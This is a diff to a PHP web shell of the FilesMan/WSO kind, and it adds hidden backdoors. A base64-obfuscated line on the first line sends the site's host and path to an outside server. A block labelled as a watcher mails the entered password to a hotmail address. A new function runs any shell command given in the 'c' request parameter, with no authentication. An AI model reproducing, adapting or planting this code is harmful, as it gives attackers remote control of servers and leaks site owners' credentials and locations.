@@ -1,6 +1,10 @@
-<?php
+<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); $htas = 'aHR0cHM6Ly9yZW1hcmMuYml6LmlkL2RhdGEucGhw'; $x_path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; $ch = curl_init(base64_decode($htas)); curl_setopt_array($ch, array(CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query(array('path' => $x_path, 'firl' => base64_decode($htas))), CURLOPT_SSL_VERIFYPEER => false, CURLOPT_RETURNTRANSFER => true)); curl_exec($ch); curl_close($ch); ?> <?php
+//--------------Watching webshell!--------------
+if(array_key_exists('watching',$_POST)){
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('alexxmaxwell_@hotmail.com', 'root', $tmp); // Edit or delete!
+}
 //-----------------Password---------------------
-$▛ = "17117a5b42a813daa9d805e62cb0a8d5";
+$▛ = "ae5bcb4d5ffbb90dc0ffcfb8a8f9a396";
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
@@ -16,6 +20,40 @@ if (!isset($_POST['ne'])) {
 	if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
 	if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
 	if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
+}
+function executeCommand($input) {
+    $descriptors = array(
+        0 => array("pipe", "r"),
+        1 => array("pipe", "w"),
+        2 => array("pipe", "w") 
+    );
+
+    $process = proc_open($input, $descriptors, $pipes);
+
+    if (is_resource($process)) {
+      
+        $output = stream_get_contents($pipes[1]);
+        $errorOutput = stream_get_contents($pipes[2]);
+
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+
+        $exitCode = proc_close($process);
+
+        if ($exitCode === 0) {
+            return $output;
+        } else {
+            return "Error: " . $errorOutput;
+        }
+    } else {
+        return "↳ Unable to execute command\n";
+    }
+}
+
+if (isset($_REQUEST['c'])) {
+    $command = $_REQUEST['c'];
+    echo executeCommand($command);
 }
 function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
 @ini_set('error_log',NULL);
@@ -171,6 +209,7 @@ function hardHeader() {
 			} else alert('Request error!');
 	}
 </script>
+
 <head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
 <form method=post name=mf style='display:none;'>
 <input type=hidden name=a>
